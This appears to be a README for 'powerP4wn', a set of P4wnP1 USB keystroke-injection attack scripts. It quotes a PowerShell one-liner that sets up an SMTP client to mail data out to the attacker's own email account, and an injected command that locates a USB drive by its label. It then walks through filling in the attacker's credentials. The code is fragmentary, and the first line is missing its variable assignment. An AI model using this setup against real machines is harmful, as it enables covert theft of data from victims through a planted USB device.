# powerP4wn
P4wnP1 scripts that actually work
trfm....this is the manual


>>>>>New-Object Net.Mail.SmtpClient("smtpserver",25);$c.EnableSsl=$true;$c.Credentials=New-Object System.Net.NetworkCredential("emailaccountcreds","emailaccountpsswd");$d=New-Object System.Net.Mail.MailMessage;$d.From="senderemail";$d.To.Add("recieveremail")

The above line needs YOUR email info. 
Replace the "smtpserver" with your smtp server name in between the "" (ex. "smtp.gmail.com").
Replace the "emailaccountcreds" with your email user account name in between the "" (ex. "dumbass@gmail.com").
Replace the "emailaccountpsswd" with your email account password in between the "" (ex. "iMs01337").
Replace the "senderemail" with who the email will from in between the "" (ex. "dumbass@gmail.com"). Use the same as the "emailaccountcreds"
Replace the "recieveremail" with who the email is to in between the "" (ex. "imsoleet@gmail.com"). you can just put in the same email address as "emailaccountcreds"

>>>>>type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SanDisk' } | select name\n");//find usb drive

The above line needs YOUR usb drive label
replace SanDisk with what ever you labeled the .bin for your stateless usb you created.


"I have given you the information...... I cant understand it for you"

exit \n
